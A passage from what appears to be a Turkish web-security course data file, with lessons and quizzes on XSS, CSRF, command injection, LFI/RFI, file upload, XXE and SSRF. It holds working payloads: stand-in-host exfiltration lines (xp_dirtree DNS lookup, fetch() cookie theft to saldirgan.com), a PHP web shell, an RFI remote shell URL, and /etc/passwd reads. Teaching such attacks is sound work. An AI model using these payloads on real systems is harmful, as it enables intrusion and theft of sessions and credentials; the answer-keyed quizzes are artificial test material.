WHERE id=1) + '.saldirgan.com'; EXEC master..xp_dirtree @host;</code></pre><p>Bu tetikleme sonucu veritaban\u0131 sunucusu <code>admin123.saldirgan.com</code> adresine DNS sorgusu atar. Sald\u0131rgan DNS loglar\u0131ndan \u015Fifreyi okur.</p>",questions:[{q:"Out-of-Band SQLi sald\u0131r\u0131lar\u0131nda veritaban\u0131 sunucusu veriyi d\u0131\u015Far\u0131 s\u0131zd\u0131rmak i\xE7in genellikle hangi protokol\xFC kullanmaya zorlan\u0131r?",options:["SMTP (E-posta)","DNS / HTTP (D\u0131\u015F istekler)","FTP","SSH"],correct:1},{q:"Out-of-Band SQLi hangi durumlarda tercih edilir?",options:["Veritaban\u0131 \u015Fifrelendi\u011Finde","Error-based veya Blind SQLi tekniklerinin a\u011F k\u0131s\u0131tlamalar\u0131 veya uygulama yap\u0131s\u0131 nedeniyle \xE7al\u0131\u015Fmad\u0131\u011F\u0131 durumlarda","Sadece MySQL kullan\u0131ld\u0131\u011F\u0131nda","A\u011F kart\u0131 bozuldu\u011Funda"],correct:1},{q:"Sald\u0131rgan\u0131n DNS isteklerini yakalamak i\xE7in kulland\u0131\u011F\u0131 dinleyici sunucu tipine ne ad verilir?",options:["Firewall","OAST / Collaborator Server","Proxy Sunucusu","DNS Cache Sunucusu"],correct:1}]},{id:"uyg-06",title:"Cross-Site Scripting (XSS) Giri\u015F",content:"<h2>Cross-Site Scripting (XSS) Temelleri</h2><p>XSS, bir web uygulamas\u0131n\u0131n kullan\u0131c\u0131dan ald\u0131\u011F\u0131 girdileri yeterince filtrelemeden veya kodlamadan sayfaya yans\u0131tmas\u0131 sonucu, sald\u0131rgan\u0131n kurban taray\u0131c\u0131s\u0131nda zararl\u0131 JavaScript kodlar\u0131 \xE7al\u0131\u015Ft\u0131rmas\u0131na yol a\xE7an bir zafiyettir.</p><p>XSS \xDC\xE7 Ana Kategoriye Ayr\u0131l\u0131r:</p><ul><li><strong>Reflected (Yans\u0131t\u0131lan) XSS:</strong> Zararl\u0131 kod URL parametresiyle g\xF6nderilir, sunucu bunu al\u0131r ve hemen sayfaya yans\u0131t\u0131r.</li><li><strong>Stored (Kal\u0131c\u0131) XSS:</strong> Zararl\u0131 kod veritaban\u0131na kaydedilir (\xF6rn. yorumlar). Sayfay\u0131 ziyaret eden herkes etkilenir.</li><li><strong>DOM-Based XSS:</strong> Zafiyet tamamen istemci taraf\u0131nda, JavaScript kodlar\u0131n\u0131n g\xFCvensiz kullan\u0131m\u0131 nedeniyle ortaya \xE7\u0131kar.</li></ul>",example:"<h3>Temel Test Payload'\u0131:</h3><p>Arama kutusuna veya URL parametresine <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> yaz\u0131larak XSS zafiyeti test edilir. Taray\u0131c\u0131da alert penceresi \xE7\u0131karsa zafiyet do\u011Frulanm\u0131\u015F olur.</p>",questions:[{q:"XSS (Cross-Site Scripting) sald\u0131r\u0131lar\u0131nda kurban\u0131n bilgisayar\u0131nda \xE7al\u0131\u015Ft\u0131r\u0131lan kod t\xFCr\xFC hangisidir?",options:["SQL sorgular\u0131","JavaScript kodlar\u0131","Python betikleri","PHP komutlar\u0131"],correct:1},{q:"Zararl\u0131 kodun veritaban\u0131na kal\u0131c\u0131 olarak kaydedildi\u011Fi ve sayfay\u0131 ziyaret eden her kullan\u0131c\u0131n\u0131n etkilendi\u011Fi XSS t\xFCr\xFC hangisidir?",options:["Reflected XSS","Stored (Kal\u0131c\u0131) XSS","DOM-Based XSS","Blind XSS"],correct:1},{q:"XSS zafiyetlerini engellemek i\xE7in yap\u0131lmas\u0131 gereken en temel i\u015Flem hangisidir?",options:["Verileri \u015Fifrelemek","\xC7\u0131kt\u0131 Kodlama (Output Encoding) ve Girdi Temizleme (Sanitization) yapmak","Kullan\u0131c\u0131lar\u0131 engellemek","HTTPS kullanmak"],correct:1}]},{id:"uyg-07",title:"Reflected XSS Sald\u0131r\u0131lar\u0131",content:"<h2>Reflected XSS</h2><p>Reflected XSS, en yayg\u0131n XSS t\xFCr\xFCd\xFCr. Sald\u0131rgan zararl\u0131 beti\u011Fi i\xE7eren \xF6zel bir ba\u011Flant\u0131 (URL) haz\u0131rlar ve bunu kurbana sosyal m\xFChendislik (e-posta, sohbet mesaj\u0131 vb.) yoluyla g\xF6nderir.</p><p>Kurban bu ba\u011Flant\u0131ya t\u0131klad\u0131\u011F\u0131nda, istek web sunucusuna gider. Sunucu, URL'deki zararl\u0131 beti\u011Fi al\u0131p olu\u015Fturdu\u011Fu HTML sayfas\u0131n\u0131n i\xE7ine g\xF6mer ve kurbana geri d\xF6ner. Kurban\u0131n taray\u0131c\u0131s\u0131 bu beti\u011Fi \xE7al\u0131\u015Ft\u0131r\u0131r.</p>",example:"<h3>\xD6rnek Sald\u0131r\u0131 URL'si:</h3><p><code>https://hedef.com/search.php?query=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code><br/>Bu linke t\u0131klayan kullan\u0131c\u0131n\u0131n taray\u0131c\u0131s\u0131nda, o siteye ait oturum \xE7erezleri (cookie) ekrana yazd\u0131r\u0131l\u0131r.</p>",questions:[{q:"Reflected XSS sald\u0131r\u0131s\u0131n\u0131n ger\xE7ekle\u015Febilmesi i\xE7in kurban\u0131n ne yapmas\u0131 gerekir?",options:["Kendi \u015Fifresini de\u011Fi\u015Ftirmesi","Sald\u0131rgan\u0131n haz\u0131rlad\u0131\u011F\u0131 \xF6zel ba\u011Flant\u0131ya (linke) t\u0131klamas\u0131","Bilgisayar\u0131n\u0131 kapatmas\u0131","Siteden \xE7\u0131k\u0131\u015F yapmas\u0131"],correct:1},{q:"Reflected XSS zafiyeti genellikle uygulaman\u0131n hangi b\xF6l\xFCmlerinde s\u0131kl\u0131kla g\xF6r\xFCl\xFCr?",options:["Veritaban\u0131 tablolar\u0131nda","Arama kutular\u0131, hata mesajlar\u0131 veya URL'ye yans\u0131yan girdi alanlar\u0131nda","\u015Eifreli sayfalarda","Admin paneli ayarlar\u0131nda"],correct:1},{q:"Reflected XSS sald\u0131r\u0131s\u0131 sonucu bir sald\u0131rgan en fazla neyi hedefleyebilir?",options:["Web sunucusunun elektri\u011Fini kesmeyi","Kurban\u0131n oturum \xE7erezlerini (Session Cookie) \xE7alarak hesab\u0131n\u0131 ele ge\xE7irmeyi","Veritaban\u0131ndaki t\xFCm verileri silmeyi","Kullan\u0131c\u0131n\u0131n IP adresini de\u011Fi\u015Ftirmeyi"],correct:1}]},{id:"uyg-08",title:"Stored XSS ve Oturum \xC7alma",content:"<h2>Stored XSS (Kal\u0131c\u0131 XSS) ve Oturum \xC7alma</h2><p>Stored XSS, en tehlikeli XSS varyasyonudur. Sald\u0131rgan, zararl\u0131 JavaScript kodunu web uygulamas\u0131ndaki bir girdi alan\u0131na (\xF6rne\u011Fin yorum formu, profil ismi, forum g\xF6nderisi) yazar ve bu veri sunucu taraf\u0131ndan veritaban\u0131na kaydedilir.</p><p>Daha sonra bu sayfay\u0131 ziyaret eden her yasal kullan\u0131c\u0131n\u0131n taray\u0131c\u0131s\u0131, veritaban\u0131ndan gelen bu zararl\u0131 kodu sayfayla birlikte y\xFCkler ve otomatik olarak \xE7al\u0131\u015Ft\u0131r\u0131r. Kurbanlar\u0131n hi\xE7bir linke t\u0131klamas\u0131na gerek kalmaz.</p>",example:"<h3>Cookie H\u0131rs\u0131zl\u0131\u011F\u0131 Payload'\u0131:</h3><pre><code>&lt;script&gt;fetch('http://saldirgan.com/log?cookie=' + document.cookie)&lt;/script&gt;</code></pre><p>Bu yorum veritaban\u0131na kaydedildi\u011Finde, sayfaya giren herkesin oturum \xE7erezleri sald\u0131rgan\u0131n sunucusuna g\xF6nderilir.</p>",questions:[{q:"Zararl\u0131 kodun veritaban\u0131na yaz\u0131ld\u0131\u011F\u0131 ve kurbanlar\u0131n sadece normal sayfay\u0131 ziyaret etmesiyle \xE7al\u0131\u015Fan XSS t\xFCr\xFC hangisidir?",options:["DOM-Based XSS","Reflected XSS","Stored XSS","Blind XSS"],correct:2},{q:"Stored XSS kullanarak oturum \xE7erezlerinin (cookie) \xE7al\u0131nmas\u0131n\u0131 engellemek i\xE7in \xE7erez tan\u0131mlan\u0131rken hangi bayrak (flag) aktif edilmelidir?",options:["Secure","HttpOnly","SameSite","Path"],correct:1},{q:"HttpOnly bayra\u011F\u0131 aktif edilmi\u015F bir \xE7ereze JavaScript kodu (document.cookie) ile eri\u015Filebilir mi?",options:["Evet, her zaman eri\u015Filir","Hay\u0131r, taray\u0131c\u0131 JavaScript'in bu \xE7erezi okumas\u0131n\u0131 engeller","Sadece HTTPS ba\u011Flant\u0131larda eri\u015Filir","Sadece adminler eri\u015Febilir"],correct:1}]},{id:"uyg-09",title:"DOM-Based XSS",content:"<h2>DOM-Based XSS</h2><p>DOM-Based XSS, zafiyetin sunucu taraf\u0131yla hi\xE7bir alakas\u0131 olmad\u0131\u011F\u0131, tamamen istemci taraf\u0131ndaki (client-side) JavaScript kodlar\u0131n\u0131n verileri g\xFCvensiz bir \u015Fekilde i\u015Flemesinden kaynaklanan XSS t\xFCr\xFCd\xFCr.</p><p>Zafiyet, taray\u0131c\u0131daki g\xFCvensiz bir veri kayna\u011F\u0131ndan (Source - \xF6rn: `location.search`, `document.referrer`) al\u0131nan verilerin, sayfada dinamik olarak HTML olu\u015Fturan g\xFCvensiz bir \xE7\u0131kt\u0131 noktas\u0131na (Sink - \xF6rn: `innerHTML`, `document.write`, `eval`) aktar\u0131lmas\u0131yla tetiklenir.</p>",example:`<h3>Zafiyetli JS Kodu:</h3><pre><code>const query = new URLSearchParams(window.location.search).get('name');
document.getElementById('welcome').innerHTML = "Merhaba " + query;</code></pre><p>Sald\u0131rgan URL'e <code>?name=&lt;img src=x onerror=alert(1)&gt;</code> girdi\u011Finde DOM-XSS tetiklenir.</p>`,questions:[{q:"DOM-Based XSS zafiyetinin di\u011Fer XSS t\xFCrlerinden en b\xFCy\xFCk fark\u0131 nedir?",options:["Veritaban\u0131nda saklanmas\u0131","Zafiyetin tamamen istemci taraf\u0131ndaki JavaScript kodlar\u0131nda (DOM kaynak ve \xE7\u0131kt\u0131 noktalar\u0131nda) ger\xE7ekle\u015Fmesi","Sadece resim dosyalar\u0131nda \xE7al\u0131\u015Fmas\u0131","Sunucu loglar\u0131nda kolayca bulunmas\u0131"],correct:1},{q:"A\u015Fa\u011F\u0131dakilerden hangisi DOM-XSS zafiyetine yol a\xE7abilecek tehlikeli bir \xE7\u0131kt\u0131 noktas\u0131d\u0131r (Sink)?",options:["textContent","innerHTML","innerText","console.log"],correct:1},{q:"DOM-XSS zafiyetini \xF6nlemek i\xE7in innerHTML yerine hangi g\xFCvenli JavaScript \xF6zelli\u011Fi tercih edilmelidir?",options:["eval()","document.write()","textContent / innerText","outerHTML"],correct:2}]},{id:"uyg-10",title:"CSRF Sald\u0131r\u0131s\u0131 ve Korunma",content:"<h2>CSRF (Cross-Site Request Forgery)</h2><p>CSRF (Siteler Aras\u0131 \u0130stek Sahtecili\u011Fi), kurban kullan\u0131c\u0131n\u0131n taray\u0131c\u0131s\u0131nda a\xE7\u0131k olan aktif oturumunu (session) kullanarak, kullan\u0131c\u0131n\u0131n bilgisi ve izni d\u0131\u015F\u0131nda arka planda yetkisiz i\u015Flemler (\u015Fifre de\u011Fi\u015Ftirme, para transferi vb.) ger\xE7ekle\u015Ftirme sald\u0131r\u0131s\u0131d\u0131r.</p><p>Taray\u0131c\u0131lar, bir siteye istek yaparken o siteye ait kay\u0131tl\u0131 \xE7erezleri (cookie) otomatik olarak iste\u011Fe ekler. Sald\u0131rgan bu mekanizmay\u0131 suistimal eder.</p>",example:'<h3>Sald\u0131r\u0131 Senaryosu:</h3><p>Sald\u0131rgan kendi sitesine gizli bir form ekler:<br/><code>&lt;form action="https://banka.com/transfer" method="POST"&gt;&lt;input name="to" value="saldirgan" /&gt;&lt;/form&gt;</code>. Kurban bu sayfaya girdi\u011Finde form JavaScript ile otomatik tetiklenir. Kurban\u0131n banka oturumu a\xE7\u0131ksa i\u015Flem ger\xE7ekle\u015Fir.</p>',questions:[{q:"CSRF (Cross-Site Request Forgery) sald\u0131r\u0131s\u0131n\u0131n temel \xE7al\u0131\u015Fma prensibi nedir?",options:["Kullan\u0131c\u0131n\u0131n \u015Fifresini kaba kuvvetle tahmin etmek","Taray\u0131c\u0131n\u0131n, hedef siteye yap\u0131lan isteklere kay\u0131tl\u0131 oturum \xE7erezlerini otomatik ekleme davran\u0131\u015F\u0131n\u0131 suistimal etmek","Veritaban\u0131n\u0131 \xE7\xF6kertmek","Kullan\u0131c\u0131n\u0131n internetini kesmek"],correct:1},{q:"A\u015Fa\u011F\u0131dakilerden hangisi CSRF sald\u0131r\u0131lar\u0131na kar\u015F\u0131 en etkili ve standart savunma y\xF6ntemidir?",options:["HttpOnly \xE7erez kullanmak","Her form/istek i\xE7in benzersiz ve tahmin edilemez bir anti-CSRF Token'\u0131 kullanmak","Kullan\u0131c\u0131 adlar\u0131n\u0131 \u015Fifrelemek","Sadece GET istekleri kullanmak"],correct:1},{q:"\xC7erezlerde kullan\u0131lan hangi \xF6zellik (attribute), \xFC\xE7\xFCnc\xFC taraf sitelerden gelen isteklere \xE7erezlerin eklenmesini engelleyerek CSRF'i zorla\u015Ft\u0131r\u0131r?",options:["Secure","Path","SameSite (Strict/Lax)","Domain"],correct:2}]},{id:"uyg-11",title:"Command Injection (Komut Enjeksiyonu) ve RCE",content:"<h2>Command Injection (Sistem Komutu Enjeksiyonu)</h2><p>Command Injection, uygulaman\u0131n kullan\u0131c\u0131dan ald\u0131\u011F\u0131 girdileri do\u011Frudan i\u015Fletim sistemi komut sat\u0131r\u0131na (shell) g\xF6nderip \xE7al\u0131\u015Ft\u0131rmas\u0131 sonucu ortaya \xE7\u0131kan \xE7ok kritik bir g\xFCvenlik a\xE7\u0131\u011F\u0131d\u0131r.</p><p>Bu zafiyet sayesinde sald\u0131rgan sunucu \xFCzerinde i\u015Fletim sistemi komutlar\u0131 (\xF6rn. `cat /etc/passwd`, `whoami`) \xE7al\u0131\u015Ft\u0131rabilir ve en y\xFCksek etki olan <strong>RCE (Remote Code Execution - Uzaktan Kod \xC7al\u0131\u015Ft\u0131rma)</strong> elde ederek sunucuyu tamamen ele ge\xE7irebilir.</p>",example:`<h3>Zafiyetli Kod (PHP):</h3><pre><code>$ip = $_POST['ip'];
system("ping -c 4 " . $ip);</code></pre><p>Sald\u0131rgan girdi olarak <code>8.8.8.8 ; cat /etc/passwd</code> g\xF6nderirse, sunucu s\u0131ras\u0131yla ping atar ve ard\u0131ndan sistemdeki kullan\u0131c\u0131 \u015Fifre dosyas\u0131n\u0131 okur.</p>`,questions:[{q:"Command Injection (Komut Enjeksiyonu) zafiyetinin sonucunda sald\u0131rgan\u0131n elde edebilece\u011Fi en tehlikeli etki hangisidir?",options:["Sayfa tasar\u0131m\u0131n\u0131 bozmak","RCE (Uzaktan Kod \xC7al\u0131\u015Ft\u0131rma - Sunucu kontrol\xFCn\xFC ele ge\xE7irme)","Kullan\u0131c\u0131n\u0131n oturumunu kapatmak","DNS kay\u0131tlar\u0131n\u0131 de\u011Fi\u015Ftirmek"],correct:1},{q:"\u0130\u015Fletim sisteminde komutlar\u0131 ard\u0131\u015F\u0131k veya zincirleme \xE7al\u0131\u015Ft\u0131rmak i\xE7in kullan\u0131lan, Command Injection testlerinde s\u0131k\xE7a kullan\u0131lan karakter hangisidir?",options:["@","#","; veya &","!"],correct:2},{q:"Command enjeksiyon zafiyetlerini \xF6nlemek i\xE7in yaz\u0131l\u0131m geli\u015Ftiricilere ne \xF6nerilmelidir?",options:["Kullan\u0131c\u0131 girdilerini sistem komut sat\u0131r\u0131na (system, exec vb.) do\u011Frudan g\xF6ndermekten ka\xE7\u0131nmak, g\xFCvenli API'lar kullanmak","T\xFCm kodlar\u0131 \u015Fifrelemek","Sadece Linux kullanmak","SSH portunu de\u011Fi\u015Ftirmek"],correct:0}]},{id:"uyg-12",title:"Local File Inclusion (LFI)",content:"<h2>Local File Inclusion (LFI) ve Path Traversal</h2><p>LFI, web uygulamas\u0131n\u0131n sunucu \xFCzerindeki yerel dosyalar\u0131 dinamik olarak sayfaya dahil etmesi (include) s\u0131ras\u0131nda, kullan\u0131c\u0131 girdilerini yeterince do\u011Frulamamas\u0131 sonucu olu\u015Fan zafiyettir.</p><p>Sald\u0131rgan <strong>Path Traversal (Dizin Ge\xE7i\u015Fi)</strong> karakterlerini (<code>../</code>) kullanarak \xFCst dizinlere t\u0131rmanabilir ve sunucuda okuma yetkisi olan kritik dosyalar\u0131 (\xF6rn: `/etc/passwd`, log dosyalar\u0131, konfig\xFCrasyonlar) okuyabilir.</p>",example:"<h3>Zafiyetli \u0130stek ve Payload:</h3><p>Uygulama: <code>https://site.com/index.php?page=about.php</code><br/>Sald\u0131r\u0131: <code>https://site.com/index.php?page=../../../../etc/passwd</code><br/>Sunucu dosyay\u0131 include eder ve i\xE7eri\u011Fini sayfaya basar.</p>",questions:[{q:"LFI (Local File Inclusion) zafiyetinde sald\u0131rgan\u0131n temel amac\u0131 nedir?",options:["Veritaban\u0131na yeni tablolar eklemek","Sunucu \xFCzerindeki yerel dosyalar\u0131 okumak veya \xE7al\u0131\u015Ft\u0131rmak","Kullan\u0131c\u0131n\u0131n \u015Fifresini de\u011Fi\u015Ftirmek","Sunucuyu kapatmak"],correct:1},{q:"\xDCst dizinlere \xE7\u0131kmak ve dizin s\u0131n\u0131rlar\u0131n\u0131 a\u015Fmak i\xE7in kullan\u0131lan Path Traversal karakter dizisi hangisidir?",options:["\\\\","&&","../","???"],correct:2},{q:"LFI zafiyetlerini \xF6nlemek i\xE7in en g\xFCvenli tasar\u0131m yakla\u015F\u0131m\u0131 nedir?",options:["Sadece resim dosyalar\u0131na izin vermek","Kullan\u0131c\u0131dan dosya ad\u0131 almak yerine, \xF6nceden tan\u0131mlanm\u0131\u015F g\xFCvenli bir dosya listesi (whitelist) \xFCzerinden se\xE7im yapt\u0131rmak","Dosya isimlerini MD5 ile hashlemek","T\xFCm dosyalar\u0131 silmek"],correct:1}]},{id:"uyg-13",title:"Remote File Inclusion (RFI)",content:"<h2>Remote File Inclusion (RFI)</h2><p>RFI, LFI zafiyetinin daha ileri bir boyutudur. Uygulaman\u0131n, d\u0131\u015Far\u0131dan gelen (uzak bir sunucuda bar\u0131nd\u0131r\u0131lan) bir dosya veya script ba\u011Flant\u0131s\u0131n\u0131 kendi kod yap\u0131s\u0131na dahil edip sunucu \xFCzerinde \xE7al\u0131\u015Ft\u0131rmas\u0131d\u0131r.</p><p>Sald\u0131rgan, kendi kontrol\xFCndeki bir web sunucusunda bar\u0131nd\u0131rd\u0131\u011F\u0131 zararl\u0131 bir web shell kodunu (\xF6rn. `http://saldirgan.com/shell.txt`) hedef uygulamaya parametre olarak g\xF6nderir. Sunucu bu uzak dosyay\u0131 kendi i\xE7ine \xE7eker ve \xE7al\u0131\u015Ft\u0131r\u0131r. Sonu\xE7 do\u011Frudan RCE'dir.</p>",example:"<h3>RFI \u0130stek Analizi:</h3><p>\u0130stek: <code>https://hedef.com/index.php?page=http://saldirgan.com/shell.txt</code><br/>E\u011Fer PHP yap\u0131land\u0131rmas\u0131nda <code>allow_url_include</code> ayar\u0131 aktifse, sunucu uzak dosyay\u0131 indirir ve kod olarak y\xFCr\xFCt\xFCr.</p>",questions:[{q:"RFI (Remote File Inclusion) zafiyetini LFI'dan ay\u0131ran en temel fark nedir?",options:["Daha yava\u015F olmas\u0131","Sadece Windows sunucularda \xE7al\u0131\u015Fmas\u0131","Uzak bir sunucudaki dosyan\u0131n hedef uygulamaya dahil edilip \xE7al\u0131\u015Ft\u0131r\u0131labilmesi","Veritaban\u0131na eri\u015Fememesi"],correct:2},{q:"PHP tabanl\u0131 sunucularda RFI zafiyetinin ger\xE7ekle\u015Febilmesi i\xE7in php.ini dosyas\u0131ndaki hangi ayar\u0131n 'On' (A\xE7\u0131k) olmas\u0131 gerekir?",options:["allow_url_fopen","allow_url_include","safe_mode","register_globals"],correct:1},{q:"RFI zafiyeti s\xF6m\xFCr\xFCld\xFC\u011F\xFCnde sald\u0131rgan genellikle sunucuda ne elde etmi\u015F olur?",options:["Sadece sayfa tasar\u0131m\u0131 bilgisi","RCE (Uzaktan Kod \xC7al\u0131\u015Ft\u0131rma / Web Shell eri\u015Fimi)","DNS \xE7\xF6z\xFCmleme yetkisi","Kullan\u0131c\u0131n\u0131n IP adresi"],correct:1}]},{id:"uyg-14",title:"File Upload (Dosya Y\xFCkleme) A\xE7\u0131kl\u0131klar\u0131",content:"<h2>File Upload (Dosya Y\xFCkleme) Zafiyetleri</h2><p>Web uygulamalar\u0131nda profil resmi, CV, belge y\xFCkleme gibi alanlar s\u0131kl\u0131kla kullan\u0131l\u0131r. E\u011Fer bu alanlara y\xFCklenen dosyalar\u0131n uzant\u0131s\u0131, tipi ve i\xE7eri\u011Fi kontrol edilmiyorsa <strong>K\u0131s\u0131tlanmam\u0131\u015F Dosya Y\xFCkleme</strong> zafiyeti ortaya \xE7\u0131kar.</p><p>Sald\u0131rgan sunucuya bir <strong>Web Shell</strong> (sunucu komutlar\u0131n\u0131 \xE7al\u0131\u015Ft\u0131rmay\u0131 sa\u011Flayan PHP/ASP scripti) y\xFCkler ve y\xFCkledi\u011Fi dosyan\u0131n yoluna taray\u0131c\u0131dan eri\u015Ferek sunucuda tam RCE elde eder.</p>",example:"<h3>Basit PHP Web Shell:</h3><pre><code>&lt;?php system($_GET['cmd']); ?&gt;</code></pre><p>Bu dosyay\u0131 <code>shell.php</code> ad\u0131yla y\xFCkleyen sald\u0131rgan taray\u0131c\u0131dan <code>/uploads/shell.php?cmd=whoami</code> adresine giderek komut \xE7al\u0131\u015Ft\u0131r\u0131r.</p>",questions:[{q:"G\xFCvenlik kontrol\xFC yap\u0131lmayan bir dosya y\xFCkleme alan\u0131na sald\u0131rgan\u0131n \xF6ncelikli olarak y\xFCklemek isteyece\u011Fi dosya t\xFCr\xFC hangisidir?",options:["B\xFCy\xFCk boyutlu bir PDF belgesi","Web Shell (zararl\u0131 script - PHP/ASP/JSP)","Kullan\u0131c\u0131 rehberi","Sahte bir JPEG resmi"],correct:1},{q:"Y\xFCklenen bir web shell dosyas\u0131n\u0131n sunucuda \xE7al\u0131\u015Fabilmesi i\xE7in gerekli olan temel ko\u015Ful nedir?",options:["Dosyan\u0131n ad\u0131n\u0131n \u015Fifreli olmas\u0131","Y\xFCklenen dizinin y\xFCr\xFCt\xFClebilir (executable) olmas\u0131 ve sald\u0131rgan\u0131n bu dosyaya taray\u0131c\u0131dan eri\u015Febilmesi","Sunucunun kapal\u0131 olmas\u0131","Dosyan\u0131n PDF uzant\u0131l\u0131 olmas\u0131"],correct:1},{q:"Dosya y\xFCkleme a\xE7\u0131klar\u0131ndan korunmak i\xE7in sunucu taraf\u0131nda hangi \xF6nlem al\u0131nmal\u0131d\u0131r?",options:["Sadece dosya boyutunu kontrol etmek","Uzant\u0131lar\u0131 s\u0131k\u0131 \u015Fekilde do\u011Frulamak (whitelist), y\xFCklenen dosyalar\u0131 y\xFCr\xFCt\xFClemez (non-executable) bir dizinde tutmak ve dosya adlar\u0131n\u0131 yeniden olu\u015Fturmak","Dosyalar\u0131 e-posta ile g\xF6ndermek","T\xFCm kullan\u0131c\u0131lar\u0131 engellemek"],correct:1}]},{id:"uyg-15",title:"File Upload Bypass Teknikleri",content:"<h2>File Upload Filtrelerini Atlama (Bypass)</h2><p>Geli\u015Ftiriciler dosya y\xFCkleme alanlar\u0131n\u0131 korumak i\xE7in baz\u0131 basit k\u0131s\u0131tlamalar ekler. Ancak sald\u0131rganlar bu filtreleri atlatmak i\xE7in \xE7e\u015Fitli y\xF6ntemler kullan\u0131r:</p><ul><li><strong>MIME-Type Bypass:</strong> \u0130stekteki <code>Content-Type</code> ba\u015Fl\u0131\u011F\u0131 <code>application/x-php</code> yerine proxy (Burp Suite) ile <code>image/jpeg</code> olarak de\u011Fi\u015Ftirilir.</li><li><strong>\xC7ift Uzant\u0131 / Null Byte:</strong> Dosya <code>shell.php.jpg</code> veya <code>shell.php%00.jpg</code> olarak isimlendirilir.</li><li><strong>Alternatif Uzant\u0131lar:</strong> `.php` engellendiyse `.php5`, `.phtml`, `.phar` uzant\u0131lar\u0131 denenir.</li></ul>",example:"<h3>Burp Suite ile Bypass:</h3><p>Sald\u0131rgan Burp Suite ile iste\u011Fi yakalar, dosya i\xE7eri\u011Fi PHP kodu olmas\u0131na ra\u011Fmen HTTP ba\u015Fl\u0131\u011F\u0131ndaki <code>Content-Type: application/octet-stream</code> alan\u0131n\u0131 <code>Content-Type: image/png</code> yaparak filtresi zay\u0131f sunucular\u0131 kand\u0131r\u0131r.</p>",questions:[{q:"\u0130stek ba\u015Fl\u0131\u011F\u0131ndaki 'Content-Type' de\u011Ferini de\u011Fi\u015Ftirerek dosya y\xFCkleme filtresini atlatma y\xF6ntemi hangisidir?",options:["Double Extension Bypass","MIME-Type Bypass","Null Byte Injection","Path Traversal"],correct:1},{q:"Sunucunun '.php' uzant\u0131s\u0131n\u0131 engelledi\u011Fi durumlarda denenebilecek alternatif PHP uzant\u0131s\u0131 hangisi olamaz?",options:[".phtml",".phar",".png",".php7"],correct:2},{q:"Sald\u0131rgan\u0131n 'shell.php.jpg' isminde bir dosya y\xFCklemesindeki temel ama\xE7 nedir?",options:["Dosyay\u0131 k\xFC\xE7\xFCltmek","Uzant\u0131 kontrol\xFC yapan basit bir istemci/sunucu filtresini atlat\u0131p dosyan\u0131n PHP olarak \xE7al\u0131\u015Fmas\u0131n\u0131 ummak","Resim galerisi olu\u015Fturmak","\u015Eifreleme yapmak"],correct:1}]},{id:"uyg-16",title:"XML External Entity (XXE)",content:"<h2>XML External Entity (XXE) Zafiyeti</h2><p>XXE, XML girdilerini i\u015Fleyen web uygulamalar\u0131nda, XML ayr\u0131\u015Ft\u0131r\u0131c\u0131s\u0131n\u0131n (parser) d\u0131\u015F referanslar\u0131 (external entities) \xE7\xF6z\xFCmleme \xF6zelli\u011Finin a\xE7\u0131k olmas\u0131ndan kaynaklanan bir zafiyettir.</p><p>Sald\u0131rgan, XML verisinin i\xE7ine sistem dosyalar\u0131n\u0131 okumay\u0131 (\xF6rn: `file:///etc/passwd`) veya i\xE7 a\u011Fdaki di\u011Fer sunuculara istek atmay\u0131 sa\u011Flayan zararl\u0131 XML varl\u0131klar\u0131 (entities) enjekte eder.</p>",example:`<h3>Zararl\u0131 XML Payload'\u0131:</h3><pre><code>&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;
&lt;!DOCTYPE foo [  
  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;
&lt;user&gt;&lt;username&gt;&amp;xxe;&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;/user&gt;</code></pre><p>XML i\u015Flendi\u011Finde, sistem \u015Fifre dosyas\u0131n\u0131n i\xE7eri\u011Fi ekrana yans\u0131t\u0131l\u0131r.</p>`,questions:[{q:"XXE zafiyetinin temel kayna\u011F\u0131 nedir?",options:["Veritaban\u0131n\u0131n yava\u015F \xE7al\u0131\u015Fmas\u0131","XML ayr\u0131\u015Ft\u0131r\u0131c\u0131s\u0131n\u0131n d\u0131\u015F varl\u0131klar\u0131 (External Entities) \xE7\xF6z\xFCmleme \xF6zelli\u011Finin a\xE7\u0131k olmas\u0131","\u015Eifrelerin XML format\u0131nda tutulmas\u0131","HTTPS kullan\u0131lmamas\u0131"],correct:1},{q:`Bir XXE payload'\u0131 i\xE7inde yer alan 'SYSTEM "file:///..."' ifadesinin amac\u0131 nedir?`,options:["XML s\xFCr\xFCm\xFCn\xFC g\xFCncellemek","Hedef sunucu \xFCzerindeki yerel bir dosyay\u0131 okumak","Kullan\u0131c\u0131y\u0131 kaydetmek","Veriyi \u015Fifrelemek"],correct:1},{q:"XXE zafiyetini \xF6nlemek i\xE7in XML k\xFCt\xFCphanelerinde hangi \xF6zellik kapat\u0131lmal\u0131d\u0131r?",options:["UTF-8 deste\u011Fi","External Entities (D\u0131\u015F Varl\u0131klar) \xE7\xF6z\xFCmleme ve DTD deste\u011Fi (Disable DTD)","Dosya okuma izni","Sadece POST metodu"],correct:1}]},{id:"uyg-17",title:"Server-Side Request Forgery (SSRF)",content:"<h2>Server-Side Request Forgery (SSRF)</h2><p>SSRF, sald\u0131rgan\u0131n web uygulamas\u0131n\u0131 manip\xFCle ederek, hedef sunucu ad\u0131na d\u0131\u015Far\u0131daki veya i\xE7 a\u011Fdaki di\u011Fer sunuculara y\xF6nelik istekler atmas\u0131n\u0131 sa\u011Flad\u0131\u011F\u0131 bir zafiyettir.</p><p>Sald\u0131rgan bu sayede sunucuyu bir proxy gibi kullanarak d\u0131\u015Far\u0131ya kapal\u0131 i\xE7 a\u011F servislerini (\xF6rn: veritabanlar\u0131, admin panelleri, AWS metadata servisleri) tarayabilir ve veri s\u0131zd\u0131rabilir.</p>",example:"<h3>\xD6rnek Senaryo:</h3><p>Uygulama d\u0131\u015Far\u0131daki bir resmi \xE7ekmek i\xE7in link al\u0131yor: <code>https://site.com/view?url=http://example.com/logo.png</code><br/>Sald\u0131rgan parametreyi i\xE7 a\u011Fa y\xF6nlendirir: <code>https://site.com/view?url=http://127.0.0.1:8080/admin</code>. Sunucu kendi localhost'undaki korumal\u0131 admin paneline eri\u015Fir ve i\xE7eri\u011Fi sald\u0131rgana g\xF6sterir.</p>",questions:[{q:"SSRF (Server-Side Request Forgery) zafiyetinin temel tan\u0131m\u0131 nedir?",options:["Kullan\u0131c\u0131 \u015Fifresini \xE7almak","Hedef sunucuya d\u0131\u015Far\u0131dan veya i\xE7 